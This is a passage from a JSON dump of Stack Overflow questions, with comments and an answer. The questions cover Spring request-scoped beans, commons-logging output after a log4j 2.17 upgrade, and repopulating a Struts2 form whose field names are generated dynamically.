RequestContextFilter to expose the current request\r\n```","title":"How to use request scoped bean in a reactor framework async call?","body":"<p>Not able to use request scoped bean in a reactor code. Facing the below exception</p>\n<pre><code>org.springframework.beans.factory.BeanCreationException: \nError creating bean with name 'scopedTarget.eventProcessor': Scope 'request' is not active for the current thread; consider defining a scoped proxy for this bean if you intend to refer to it from a singleton;\n</code></pre>\n<p>nested exception is <code>java.lang.IllegalStateException:</code></p>\n<pre><code>No thread-bound request found: \nAre you referring to request attributes outside of an actual web request, or processing a request outside of the originally receiving thread? \nIf you are actually operating within a web request and still receive this message, your code is probably running outside of DispatcherServlet: In this case, use RequestContextListener or RequestContextFilter to expose the current request\n</code></pre>\n"},{"tags":["java","spring","maven","log4j","log4j2"],"comments":[{"owner":{"account_id":9504657,"reputation":7440,"user_id":7064617,"display_name":"JCompetence"},"score":0,"creation_date":1640254052,"post_id":70460424,"comment_id":124553020,"body_markdown":"May also show the code of how you are instantiating LOG","body":"May also show the code of how you are instantiating LOG"},{"owner":{"account_id":16269349,"reputation":13452,"user_id":11748454,"display_name":"Piotr P. Karwasz"},"score":2,"creation_date":1640254603,"post_id":70460424,"comment_id":124553209,"body_markdown":"Enable JCL diagnostics by setting `-Dorg.apache.commons.logging.diagnostics.dest=STDERR` as JVM option: you might have  multiple `LogFactory` implementations in your classpath and JCL might use the wrong one. You might also have drop-in replacements for JCL on your classpath, such as `jcl-over-slf4j`.","body":"Enable JCL diagnostics by setting <code>-Dorg.apache.commons.logging.diagnostics.dest=STDERR</code> as JVM option: you might have  multiple <code>LogFactory</code> implementations in your classpath and JCL might use the wrong one. You might also have drop-in replacements for JCL on your classpath, such as <code>jcl-over-slf4j</code>."},{"owner":{"account_id":7682828,"reputation":504,"user_id":5821591,"accept_rate":40,"display_name":"Hitesh Kumar"},"score":0,"creation_date":1640260560,"post_id":70460424,"comment_id":124555156,"body_markdown":"I removed the log4j-jcl dependency looks like it&#39;s working, testing it. Thank you Piotr","body":"I removed the log4j-jcl dependency looks like it&#39;s working, testing it. Thank you Piotr"}],"owner":{"account_id":7682828,"reputation":504,"user_id":5821591,"accept_rate":40,"display_name":"Hitesh Kumar"},"comment_count":3,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":2439,"favorite_count":0,"down_vote_count":1,"up_vote_count":1,"answer_count":0,"score":0,"last_activity_date":1640254913,"creation_date":1640253391,"question_id":70460424,"body_markdown":"I upgraded log4j from 1.x to 2.17 successfully but there is no log messages printing.\r\nI debug and found org.apache.commons.logging (already exist in .java files) is not printing any log messages but if I change this to org.slf4j.logging it will work.\r\nSo one solution is change the package in all 100s of java file, before going with that I am looking any solution which will print log message with existing code.\r\n\r\nupdated log4j2.xml\r\n\r\n    &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\r\n    &lt;Configuration&gt;\r\n    \r\n    \t&lt;Appenders&gt;\r\n    \t\t&lt;Console name=&quot;CONSOLE&quot;&gt;\r\n    \t\t\t&lt;PatternLayout\r\n    \t\t\t\tpattern=&quot;[%t] %d{yyyy-MM-dd HH:mm:ss,SSSZ} %-10p [%l] : %m%n&quot;&gt;&lt;/PatternLayout&gt;\r\n    \t\t&lt;/Console&gt;\r\n    \r\n    \t\t&lt;RollingFile name=&quot;FILE&quot; fileName=&quot;${sys:catalina.home}/logs/xyz.log&quot;\r\n    \t\t\tfilePattern=&quot;${sys:catalina.home}/logs/xyz-%d{yyyy-MM-dd}-%i.log&quot;&gt;\r\n    \t\t\t&lt;PatternLayout pattern=&quot;[%t] %d{yyyy-MM-dd HH:mm:ss,SSSZ} %-10p [%l] : %m%n&quot;&gt;&lt;/PatternLayout&gt;\r\n    \t\t\t&lt;SizeBasedTriggeringPolicy size=&quot;70 MB&quot;&gt;&lt;/SizeBasedTriggeringPolicy&gt;\r\n    \t\t\t&lt;DefaultRolloverStrategy max=&quot;200&quot;&gt;\r\n    \t\t\t\t&lt;Delete basePath=&quot;${sys:catalina.home}/logs&quot; maxDepth=&quot;1&quot;&gt;\r\n    \t\t\t\t\t&lt;IfFileName glob=&quot;xyz*-*-*-*.log&quot;&gt;&lt;/IfFileName&gt;\r\n    \t\t\t\t\t&lt;IfLastModified age=100d&quot;&gt;&lt;/IfLastModified&gt;\r\n    \t\t\t\t&lt;/Delete&gt;\r\n    \t\t\t&lt;/DefaultRolloverStrategy&gt;\r\n    \t\t&lt;/RollingFile&gt;\r\n    \r\n    \r\n    \t&lt;/Appenders&gt;\r\n    \r\n    \t&lt;Loggers&gt;\r\n    \t\t&lt;AsyncRoot level=&quot;${sys:log4j.priority}&quot; includeLocation=&quot;true&quot;&gt;\r\n    \t\t\t&lt;AppenderRef ref=&quot;CONSOLE&quot; level=&quot;debug&quot; /&gt;\r\n    \t\t\t&lt;AppenderRef ref=&quot;FILE&quot; level=&quot;debug&quot;&gt;&lt;/AppenderRef&gt;\r\n    \t\t&lt;/AsyncRoot&gt;\r\n    \t&lt;/Loggers&gt;\r\n    \r\n    \r\n    &lt;/Configuration&gt;\r\n\r\ndependencies I modified:\r\n\r\n    &lt;dependency&gt;\r\n          &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;\r\n          &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;\r\n          &lt;version&gt;2.17.0&lt;/version&gt;\r\n          &lt;scope&gt;compile&lt;/scope&gt;\r\n        &lt;/dependency&gt;\r\n     &lt;dependency&gt;\r\n          &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;\r\n          &lt;artifactId&gt;log4j-slf4j-impl&lt;/artifactId&gt;\r\n          &lt;version&gt;2.17.0&lt;/version&gt;\r\n          &lt;scope&gt;test&lt;/scope&gt;\r\n        &lt;/dependency&gt;\r\n    &lt;dependency&gt;\r\n          &lt;groupId&gt;commons-logging&lt;/groupId&gt;\r\n          &lt;artifactId&gt;commons-logging&lt;/artifactId&gt;\r\n          &lt;version&gt;1.2&lt;/version&gt;\r\n          &lt;scope&gt;compile&lt;/scope&gt;\r\n        &lt;/dependency&gt;\r\n       &lt;dependency&gt;\r\n          &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;\r\n          &lt;artifactId&gt;log4j-jcl&lt;/artifactId&gt;\r\n          &lt;version&gt;2.17.0&lt;/version&gt;\r\n          &lt;scope&gt;compile&lt;/scope&gt;\r\n        &lt;/dependency&gt;\r\n\r\none of the Java class:\r\n\r\n    import org.apache.commons.logging.Log;\r\n    import org.apache.commons.logging.LogFactory;\r\n    \r\n    public class controller{\r\n     protected final Log logger = LogFactory.getLog(getClass());\r\n     ......\r\n    }\r\n\r\n","title":"common.logging not printing log messages after upgrade to log4j 2.17","body":"<p>I upgraded log4j from 1.x to 2.17 successfully but there is no log messages printing.\nI debug and found org.apache.commons.logging (already exist in .java files) is not printing any log messages but if I change this to org.slf4j.logging it will work.\nSo one solution is change the package in all 100s of java file, before going with that I am looking any solution which will print log message with existing code.</p>\n<p>updated log4j2.xml</p>\n<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\n&lt;Configuration&gt;\n\n    &lt;Appenders&gt;\n        &lt;Console name=&quot;CONSOLE&quot;&gt;\n            &lt;PatternLayout\n                pattern=&quot;[%t] %d{yyyy-MM-dd HH:mm:ss,SSSZ} %-10p [%l] : %m%n&quot;&gt;&lt;/PatternLayout&gt;\n        &lt;/Console&gt;\n\n        &lt;RollingFile name=&quot;FILE&quot; fileName=&quot;${sys:catalina.home}/logs/xyz.log&quot;\n            filePattern=&quot;${sys:catalina.home}/logs/xyz-%d{yyyy-MM-dd}-%i.log&quot;&gt;\n            &lt;PatternLayout pattern=&quot;[%t] %d{yyyy-MM-dd HH:mm:ss,SSSZ} %-10p [%l] : %m%n&quot;&gt;&lt;/PatternLayout&gt;\n            &lt;SizeBasedTriggeringPolicy size=&quot;70 MB&quot;&gt;&lt;/SizeBasedTriggeringPolicy&gt;\n            &lt;DefaultRolloverStrategy max=&quot;200&quot;&gt;\n                &lt;Delete basePath=&quot;${sys:catalina.home}/logs&quot; maxDepth=&quot;1&quot;&gt;\n                    &lt;IfFileName glob=&quot;xyz*-*-*-*.log&quot;&gt;&lt;/IfFileName&gt;\n                    &lt;IfLastModified age=100d&quot;&gt;&lt;/IfLastModified&gt;\n                &lt;/Delete&gt;\n            &lt;/DefaultRolloverStrategy&gt;\n        &lt;/RollingFile&gt;\n\n\n    &lt;/Appenders&gt;\n\n    &lt;Loggers&gt;\n        &lt;AsyncRoot level=&quot;${sys:log4j.priority}&quot; includeLocation=&quot;true&quot;&gt;\n            &lt;AppenderRef ref=&quot;CONSOLE&quot; level=&quot;debug&quot; /&gt;\n            &lt;AppenderRef ref=&quot;FILE&quot; level=&quot;debug&quot;&gt;&lt;/AppenderRef&gt;\n        &lt;/AsyncRoot&gt;\n    &lt;/Loggers&gt;\n\n\n&lt;/Configuration&gt;\n</code></pre>\n<p>dependencies I modified:</p>\n<pre><code>&lt;dependency&gt;\n      &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;\n      &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;\n      &lt;version&gt;2.17.0&lt;/version&gt;\n      &lt;scope&gt;compile&lt;/scope&gt;\n    &lt;/dependency&gt;\n &lt;dependency&gt;\n      &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;\n      &lt;artifactId&gt;log4j-slf4j-impl&lt;/artifactId&gt;\n      &lt;version&gt;2.17.0&lt;/version&gt;\n      &lt;scope&gt;test&lt;/scope&gt;\n    &lt;/dependency&gt;\n&lt;dependency&gt;\n      &lt;groupId&gt;commons-logging&lt;/groupId&gt;\n      &lt;artifactId&gt;commons-logging&lt;/artifactId&gt;\n      &lt;version&gt;1.2&lt;/version&gt;\n      &lt;scope&gt;compile&lt;/scope&gt;\n    &lt;/dependency&gt;\n   &lt;dependency&gt;\n      &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;\n      &lt;artifactId&gt;log4j-jcl&lt;/artifactId&gt;\n      &lt;version&gt;2.17.0&lt;/version&gt;\n      &lt;scope&gt;compile&lt;/scope&gt;\n    &lt;/dependency&gt;\n</code></pre>\n<p>one of the Java class:</p>\n<pre><code>import org.apache.commons.logging.Log;\nimport org.apache.commons.logging.LogFactory;\n\npublic class controller{\n protected final Log logger = LogFactory.getLog(getClass());\n ......\n}\n</code></pre>\n"},{"tags":["java","struts2"],"comments":[{"owner":{"account_id":698222,"reputation":50202,"user_id":573032,"accept_rate":77,"display_name":"Roman C"},"score":0,"creation_date":1639765767,"post_id":70396667,"comment_id":124440883,"body_markdown":"It&#39;s not possible without code. If you have a specific problem or error then you should write it to the question. If you don&#39;t know how to write a cod then the basics are in the [documentation](https://struts.apache.org/getting-started).","body":"It&#39;s not possible without code. If you have a specific problem or error then you should write it to the question. If you don&#39;t know how to write a cod then the basics are in the <a href=\"https://struts.apache.org/getting-started\" rel=\"nofollow noreferrer\">documentation</a>."},{"owner":{"account_id":18850169,"reputation":25,"user_id":13749495,"display_name":"Muzammil Shaikh"},"score":0,"creation_date":1639996613,"post_id":70396667,"comment_id":124481787,"body_markdown":"Hi @RomanC, not sure I understood correctly what you mean by _It&#39;s not possible without code_. We have a Struts2 application where it is the first time we are required to have dynamic forms where form field names are not known before hand. As you can see in the second code-snippet above, when I try to set the value of text area to the value of request parameter name resolved by `#parameters.%{&#39;question_&#39; + surveyQuestionId}`, instead of getting the parameter value it resolves to the text &#39;question_2&#39; getting displayed in the text area, where 2 is value of property `surveyQuestionId`.","body":"Hi @RomanC, not sure I understood correctly what you mean by <i>It&#39;s not possible without code</i>. We have a Struts2 application where it is the first time we are required to have dynamic forms where form field names are not known before hand. As you can see in the second code-snippet above, when I try to set the value of text area to the value of request parameter name resolved by <code>#parameters.%{&#39;question_&#39; + surveyQuestionId}</code>, instead of getting the parameter value it resolves to the text &#39;question_2&#39; getting displayed in the text area, where 2 is value of property <code>surveyQuestionId</code>."},{"owner":{"account_id":18850169,"reputation":25,"user_id":13749495,"display_name":"Muzammil Shaikh"},"score":0,"creation_date":1639996914,"post_id":70396667,"comment_id":124481903,"body_markdown":"Similarly, the radio box does get pre-selected if I hard-code the value in `s:radio` tag value attribute to `#parameters.question_4` instead of `#parameters.%{&#39;question_&#39; + surveyQuestionId}`. However, as the question id depends on the current question object in iteration, it is not possible to hard-code the question id value. I hope I have  explained better here.","body":"Similarly, the radio box does get pre-selected if I hard-code the value in <code>s:radio</code> tag value attribute to <code>#parameters.question_4</code> instead of <code>#parameters.%{&#39;question_&#39; + surveyQuestionId}</code>. However, as the question id depends on the current question object in iteration, it is not possible to hard-code the question id value. I hope I have  explained better here."},{"owner":{"account_id":698222,"reputation":50202,"user_id":573032,"accept_rate":77,"display_name":"Roman C"},"score":0,"creation_date":1640013563,"post_id":70396667,"comment_id":124488026,"body_markdown":"The code, I mean the relevant code should be posted. We need to see how parameters are handled by the action class. We also need to see the `struts.xml` for better understanding the action flow. We don&#39;t use low level objects like `HttpServletRequest` to retrieve parameters. Event if you know how to get parameters from the action context using OGNL, you should also know how to use `params` interceptor to populate them to the action. Although there&#39;s better way to handle multiple parameters using indexes...","body":"The code, I mean the relevant code should be posted. We need to see how parameters are handled by the action class. We also need to see the <code>struts.xml</code> for better understanding the action flow. We don&#39;t use low level objects like <code>HttpServletRequest</code> to retrieve parameters. Event if you know how to get parameters from the action context using OGNL, you should also know how to use <code>params</code> interceptor to populate them to the action. Although there&#39;s better way to handle multiple parameters using indexes..."},{"owner":{"account_id":698222,"reputation":50202,"user_id":573032,"accept_rate":77,"display_name":"Roman C"},"score":0,"creation_date":1640013573,"post_id":70396667,"comment_id":124488030,"body_markdown":"...IMHO if you use dynamic variables then they should be created on the server before the view result is returned, so the variables could be preselected from the value stack by the `prepare` interceptor. It would be better if you use the validation on the action flow. And why you should do this all. Because what are you trying to achieve is a double evaluation of the OGNL expression which I think is discoveraged in S2.","body":"...IMHO if you use dynamic variables then they should be created on the server before the view result is returned, so the variables could be preselected from the value stack by the <code>prepare</code> interceptor. It would be better if you use the validation on the action flow. And why you should do this all. Because what are you trying to achieve is a double evaluation of the OGNL expression which I think is discoveraged in S2."},{"owner":{"account_id":18850169,"reputation":25,"user_id":13749495,"display_name":"Muzammil Shaikh"},"score":0,"creation_date":1640020483,"post_id":70396667,"comment_id":124490843,"body_markdown":"Hi @RomanC, I have edited the post and added action mapping as well as Action class code to the post. Can you suggest a any example or tutorial link that may help me in achieving it the way you are recommending. Thanks!","body":"Hi @RomanC, I have edited the post and added action mapping as well as Action class code to the post. Can you suggest a any example or tutorial link that may help me in achieving it the way you are recommending. Thanks!"}],"answers":[{"tags":[],"owner":{"account_id":18850169,"reputation":25,"user_id":13749495,"display_name":"Muzammil Shaikh"},"down_vote_count":0,"up_vote_count":0,"is_accepted":true,"score":0,"last_activity_date":1640254410,"creation_date":1640254410,"answer_id":70460621,"question_id":70396667,"body_markdown":"We have finally solved the problem. The initial implementation was heading in a completely wrong direction but thanks to the clue from @RomanC, we re-factored the code and removed the direct use of `HttpServletRequest` to finally have a working solution. Core idea was to use a Bean for capturing response and have a `List` of those beans in the Action class corresponding to each survey question. On form submit, response is captured into the bean objects behind the scene by framework itself and thus available for further logic processing in submit handler action method.","title":"Struts2 - How to repopulate form having dynamically generated fieldnames (via expression) with submitted values after validation error","body":"<p>We have finally solved the problem. The initial implementation was heading in a completely wrong direction but thanks to the clue from @RomanC, we re-factored the code and removed the direct use of <code>HttpServletRequest</code> to finally have a working solution. Core idea was to use a Bean for capturing response and have a <code>List</code> of those beans in the Action class corresponding to each survey question. On form submit, response is captured into the bean objects behind the scene by framework itself and thus available for further logic processing in submit handler action method.</p>\n"}],"owner":{"account_id":18850169,"reputation":25,"user_id":13749495,"display_name":"Muzammil Shaikh"},"comment_count":6,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":59,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":70460621,"answer_count":1,"score":0,"last_activity_date":1640254410,"creation_date":1639761346,"question_id":70396667,"body_markdown":"We have a Struts2 application where we are building survey feature using which application users will be able to create surveys by adding different questions. \r\n\r\nThese questions are comprised of question text and an html control for getting response. \r\n\r\nThe html controls so far supported are *single* and *multi-select list*, *text field*, *textarea*, *checkbox* and *radiobox*. \r\n\r\nSo the survey form renders displaying all questions added by the user where each question has its question text displayed followed by the html field control selected for that question. \r\n\r\nBasically, it is a dynamic form where form field names are being dynamically generated as all surveys will be different and therefore there are no properties in the Action class backing survey form fields. \r\n\r\nWe are generating form field name using prefix `question_` appended with database id of the question to represent each question response input field uniquely. Here is a snippet from our JSP page to make things clear.\r\n\r\n```html\r\n    &lt;s:form id=&quot;surveyForm&quot; action=&quot;survey/submitFeedback&quot;&gt;\r\n\r\n      &lt;s:iterator value=&quot;surveyQuestions&quot;&gt;\r\n        &lt;p class=&quot;form-group &lt;s:if test=&quot;%{fieldErrors.get(&#39;question_&#39; + surveyQuestionId).size() &gt; 0}&quot;&gt;has-error&lt;/s:if&gt;&quot; &gt;\r\n          &lt;label class=&quot;control-label&quot; &gt;\r\n            &lt;s:property value=&quot;questionText&quot;/&gt;\r\n          &lt;/label&gt;\r\n          &lt;s:if test=&quot;required&quot; &gt;&lt;span style=&#39;color:red&#39;&gt;*&lt;/span&gt;&lt;/s:if&gt;\r\n          &lt;br&gt;\r\n          &lt;s:if test=&quot;surveyQuestionType.type == @com.reach150.enumeration.SurveyQuestionTypeEnum@OPENENDED_TEXTFIELD&quot; &gt;\r\n            &lt;s:textfield name=&quot;question_%{surveyQuestionId}&quot; cssClass=&quot;form-control&quot; maxlength=&quot;charactersLimit&quot; /&gt;\r\n          &lt;/s:if&gt;\r\n          &lt;s:elseif test=&quot;surveyQuestionType.type == @com.reach150.enumeration.SurveyQuestionTypeEnum@OPENENDED_TEXTAREA&quot; &gt;\r\n            &lt;s:textarea name=&quot;question_%{surveyQuestionId}&quot; style=&quot;height: 150px; width: 400px;&quot; cssClass=&quot;form-control&quot; maxlength=&quot;charactersLimit&quot; /&gt;\r\n          &lt;/s:elseif&gt;\r\n          &lt;s:elseif test=&quot;surveyQuestionType.type == @com.reach150.enumeration.SurveyQuestionTypeEnum@SINGLESELECTDROPDOWN || surveyQuestionType.type == @com.reach150.enumeration.SurveyQuestionTypeEnum@MULTISELECTDROPDOWN&quot; &gt;\r\n            &lt;s:select name=&quot;question_%{surveyQuestionId}&quot; list=&quot;orderedSelectOptions&quot; listKey=&quot;optionValue&quot; listValue=&quot;optionLabel&quot; emptyOption=&quot;true&quot; multiple=&quot;true&quot; cssClass=&quot;form-control&quot; /&gt;\r\n          &lt;/s:elseif&gt;\r\n          &lt;s:else&gt;\r\n            &lt;s:radio name=&quot;question_%{surveyQuestionId}&quot; list=&quot;#{&#39;true&#39;:&#39;Yes&#39;,&#39;false&#39;:&#39;No&#39;}&quot; cssClass=&quot;radioMarginRight&quot; /&gt;\r\n          &lt;/s:else&gt;\r\n          &lt;span class=&quot;help-block&quot; for=&quot;question_${surveyQuestionId}&quot;&gt;\r\n            &lt;s:fielderror cssClass=&quot;font-bold text-danger&quot;&gt;\r\n              &lt;s:param&gt;question_&lt;s:property value=&quot;surveyQuestionId&quot; /&gt;&lt;/s:param&gt;\r\n            &lt;/s:fielderror&gt;\r\n          &lt;/span&gt;\r\n          &lt;br/&gt;\r\n        &lt;/p&gt;      \r\n      &lt;/s:iterator&gt;      \r\n      &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary btn-lg pull-right &quot;&gt;&lt;s:if test=&quot;survey.requestReferral == true&quot;&gt;Next&lt;/s:if&gt;&lt;s:else&gt;Done&lt;/s:else&gt;&lt;/button&gt;\r\n      \r\n    &lt;/s:form&gt;\r\n```\r\n\r\nOn form submit, in the action class we are using `HttpServletRequest` to get submitted form field values. The way we identify which question the answer belongs to is through the request parameter name which as can be seen in the above JSP snippet starts with prefix &#39;question_&#39; followed by question Id. So we split the parameter name to get the question id and associate value against that question.\r\n\r\nThe problem we are facing is with repopulating survey form with submitted values when the page is presented back to the user in case of validation error as the parameter names are dynamic and cannot be backed by properties defined in Action class.\r\n\r\nI have tried to populate *radio button* and *textarea* fields using the below code and several other ways but to no avail\r\n\r\n```html\r\n    &lt;s:textarea name=&quot;question_%{surveyQuestionId}&quot; style=&quot;height: 150px; width: 400px;&quot; cssClass=&quot;form-control&quot; maxlength=&quot;charactersLimit&quot; value=&quot;#parameters.%{&#39;question_&#39; + surveyQuestionId}&quot; /&gt;\r\n\r\n    &lt;s:radio name=&quot;question_%{surveyQuestionId}&quot; value=&quot;#parameters.%{&#39;question_&#39; + surveyQuestionId}&quot; list=&quot;#{&#39;true&#39;:&#39;Yes&#39;,&#39;false&#39;:&#39;No&#39;}&quot; cssClass=&quot;radioMarginRight&quot; /&gt;\r\n```\r\nBelow is the action mapping for survey submit action\r\n\r\n```html\r\n&lt;action name=&quot;survey/submitFeedback&quot; class=&quot;surveyAction&quot; method=&quot;submitFeedback&quot;&gt;\r\n    &lt;result name=&quot;success&quot; type=&quot;tiles&quot;&gt;survey.submit&lt;/result&gt;\r\n    &lt;result name=&quot;error&quot; type=&quot;tiles&quot;&gt;survey.view&lt;/result&gt;\r\n    &lt;param name=&quot;public&quot;&gt;true&lt;/param&gt;\r\n&lt;/action&gt;\r\n```\r\n\r\nHere is the code in Action class handling the submit logic:\r\n\r\n    private Integer npsScore = 0;\r\n    private Map&lt;String, String[]&gt; surveyResponseQuestionAnswerMap = new HashMap&lt;&gt;();\r\n\r\n        public String submitFeedback() {\r\n    \r\n    \ttry {\r\n        \tif (requestId == null) {\r\n        \t\taddActionError(&quot;Request Id missing! Invalid Request!&quot;);\r\n        \t\tthrow new Exception(&quot;Invalid Request!&quot;);\r\n        \t}\r\n        \t\r\n        \tsurveyRequest = surveyService.getSurveyRequestByUUID(requestId);\r\n    \t\tif (surveyRequest == null) {\r\n        \t\taddActionError(&quot;Request Id Invalid! Invalid Request!&quot;);\r\n        \t\tthrow new Exception(&quot;Request Id Invalid! Invalid Request!&quot;);\r\n    \t\t}\r\n    \t\tloadQuestionAnswersMap();\r\n    \t\tvalidateSurveyFeedback();\r\n    \t\t\r\n    \t\tif (hasErrors()) {\r\n    \t\t\tthrow new Exception(&quot;Error submitting response!&quot;);\r\n\t\t\t} else {\r\n\t\t\t\tsurveyService.parseAndSaveSurveyResponse(surveyRequest, surveyResponseQuestionAnswerMap);\r\n    \t\t\tsetSurveyCustomMessages(surveyService.getSurveyCustomMessagesSettingBySurveyId(survey.getSurveyId()));\r\n\t\t\t}\r\n        \treturn SUCCESS;\r\n    \t} catch (Exception e) {\r\n    \t\taddActionError(&quot;Error submitting response!&quot;);\r\n    \t\tlogger.error(e);\r\n\t\t\tloadSurvey();\r\n\t\t\treturn ERROR;\r\n    \t}\r\n    }\r\n    \r\n    private void loadQuestionAnswersMap() {\r\n    \tHttpServletRequest httpRequest = ActionUtil.getRequest();\r\n    \tEnumeration&lt;String&gt; parameterNames = httpRequest.getParameterNames();\r\n    \twhile (parameterNames.hasMoreElements()) {\r\n    \t\tString parameterName = parameterNames.nextElement();\r\n    \t\tif (parameterName.startsWith(&quot;question_&quot;)) {\r\n\t    \t\tString[] values = httpRequest.getParameterValues(parameterName);\r\n\t    \t\tif (values != null) {\r\n\t    \t\t\tsurveyResponseQuestionAnswerMap.put(parameterName, values);\r\n\t    \t\t}\r\n    \t\t}\r\n    \t}\r\n    }\r\n    \r\n    private void validateSurveyFeedback() throws Exception {\r\n\t\t\r\n\t\tHttpServletRequest httpRequest = ActionUtil.getRequest();\r\n\t\tSurvey survey = surveyRequest.getSurvey();\r\n\t\tif (survey.isUseNetPromotorScore()) {\r\n\t\t\tString npsScoreStr = httpRequest.getParameter(&quot;npsScore&quot;);\r\n\t\t\tif (StringUtils.isBlank(npsScoreStr)) {\r\n\t\t\t\tthis.addFieldError(&quot;npsScore&quot;, &quot;Answer is required&quot;);\r\n\t\t\t} else {\r\n\t\t\t\tsetNpsScore(Integer.valueOf(npsScoreStr));\r\n\t\t\t}\r\n\t\t}\r\n\t\tList&lt;SurveyQuestion&gt; requiredQuestions = surveyQuestionService.getRequiredSurveyQuestionsForSurvey(surveyRequest.getSurvey());\r\n\t\tfor (SurveyQuestion requiredQuestion : requiredQuestions) {\r\n\t\t\tInteger requiredQuestionId = requiredQuestion.getSurveyQuestionId();\r\n\t\t\tString requiredQuestionFieldParameterName = &quot;question_&quot; + requiredQuestionId;\r\n\t\t\tlogger.info(&quot;Required Question Field Parameter Name: &quot; + requiredQuestionFieldParameterName);\r\n\t\t\tString[] answers = httpRequest.getParameterValues(requiredQuestionFieldParameterName);\r\n\t\t\tif (answers == null) {\r\n\t\t\t\tthis.addFieldError(requiredQuestionFieldParameterName, &quot;Answer is required&quot;);\r\n\t\t\t} else {\r\n\t\t\t\tboolean noValue = true;\r\n\t\t\t\tfor (String answer : answers) {\r\n\t\t\t\t\tif (StringUtils.isNotBlank(answer)) {\r\n\t\t\t\t\t\tnoValue = false;\r\n\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t\tif (noValue) {\r\n\t\t\t\t\tthis.addFieldError(requiredQuestionFieldParameterName, &quot;Answer is required&quot;);\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n    }","title":"Struts2 - How to repopulate form having dynamically generated fieldnames (via expression) with submitted values after validation error","body":"<p>We have a Struts2 application where we are building survey feature using which application users will be able to create surveys by adding different questions.</p>\n<p>These questions are comprised of question text and an html control for getting response.</p>\n<p>The html controls so far supported are <em>single</em> and <em>multi-select list</em>, <em>text field</em>, <em>textarea</em>, <em>checkbox</em> and <em>radiobox</em>.</p>\n<p>So the survey form renders displaying all questions added by the user where each question has its question text displayed followed by the html field control selected for that question.</p>\n<p>Basically, it is a dynamic form where form field names are being dynamically generated as all surveys will be different and therefore there are no properties in the Action class backing survey form fields.</p>\n<p>We are generating form field name using prefix <code>question_</code> appended with database id of the question to represent each question response input field uniquely. Here is a snippet from our JSP page to make things clear.</p>\n<pre class=\"lang-html prettyprint-override\"><code>    &lt;s:form id=&quot;surveyForm&quot; action=&quot;survey/submitFeedback&quot;&gt;\n\n      &lt;s:iterator value=&quot;surveyQuestions&quot;&gt;\n        &lt;p class=&quot;form-group &lt;s:if test=&quot;%{fieldErrors.get('question_' + surveyQuestionId).size() &gt; 0}&quot;&gt;has-error&lt;/s:if&gt;&quot; &gt;\n          &lt;label class=&quot;control-label&quot; &gt;\n            &lt;s:property value=&quot;questionText&quot;/&gt;\n          &lt;/label&gt;\n          &lt;s:if test=&quot;required&quot; &gt;&lt;span style='color:red'&gt;*&lt;/span&gt;&lt;/s:if&gt;\n          &lt;br&gt;\n          &lt;s:if test=&quot;surveyQuestionType.type == @com.reach150.enumeration.SurveyQuestionTypeEnum@OPENENDED_TEXTFIELD&quot; &gt;\n            &lt;s:textfield name=&quot;question_%{surveyQuestionId}&quot; cssClass=&quot;form-control&quot; maxlength=&quot;charactersLimit&quot; /&gt;\n          &lt;/s:if&gt;\n          &lt;s:elseif test=&quot;surveyQuestionType.type == @com.reach150.enumeration.SurveyQuestionTypeEnum@OPENENDED_TEXTAREA&quot; &gt;\n            &lt;s:textarea name=&quot;question_%{surveyQuestionId}&quot; style=&quot;height: 150px; width: 400px;&quot; cssClass=&quot;form-control&quot; maxlength=&quot;charactersLimit&quot; /&gt;\n          &lt;/s:elseif&gt;\n          &lt;s:elseif test=&quot;surveyQuestionType.type == @com.reach150.enumeration.SurveyQuestionTypeEnum@SINGLESELECTDROPDOWN || surveyQuestionType.type == @com.reach150.enumeration.SurveyQuestionTypeEnum@MULTISELECTDROPDOWN&quot; &gt;\n            &lt;s:select name=&quot;question_%{surveyQuestionId}&quot; list=&quot;orderedSelectOptions&quot; listKey=&quot;optionValue&quot; listValue=&quot;optionLabel&quot; emptyOption=&quot;true&quot; multiple=&quot;true&quot; cssClass=&quot;form-control&quot; /&gt;\n          &lt;/s:elseif&gt;\n          &lt;s:else&gt;\n            &lt;s:radio name=&quot;question_%{surveyQuestionId}&quot; list=&quot;#{'true':'Yes','false':'No'}&quot; cssClass=&quot;radioMarginRight&quot; /&gt;\n          &lt;/s:else&gt;\n          &lt;span class=&quot;help-block&quot; for=&quot;question_${surveyQuestionId}&quot;&gt;\n            &lt;s:fielderror cssClass=&quot;font-bold text-danger&quot;&gt;\n              &lt;s:param&gt;question_&lt;s:property value=&quot;surveyQuestionId&quot; /&gt;&lt;/s:param&gt;\n            &lt;/s:fielderror&gt;\n          &lt;/span&gt;\n          &lt;br/&gt;\n        &lt;/p&gt;      \n      &lt;/s:iterator&gt;      \n      &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary btn-lg pull-right &quot;&gt;&lt;s:if test=&quot;survey.requestReferral == true&quot;&gt;Next&lt;/s:if&gt;&lt;s:else&gt;Done&lt;/s:else&gt;&lt;/button&gt;\n      \n    &lt;/s:form&gt;\n</code></pre>\n<p>On form submit, in the action class we are using <code>HttpServletRequest</code> to get submitted form field values. The way we identify which question the answer belongs to is through the request parameter name which as can be seen in the above JSP snippet starts with prefix 'question_' followed by question Id. So we split the parameter name to get the question id and associate value against that question.</p>\n<p>The problem we are facing is with repopulating survey form with submitted values when the page is presented back to the user in case of validation error as the parameter names are dynamic and cannot be backed by properties defined in Action class.</p>\n<p>I have tried to populate <em>radio button</em> and <em>textarea</em> fields using the below code and several other ways but to no avail</p>\n<pre class=\"lang-html prettyprint-override\"><code>    &lt;s:textarea name=&quot;question_%{surveyQuestionId}&quot; style=&quot;height: 150px; width: 400px;&quot; 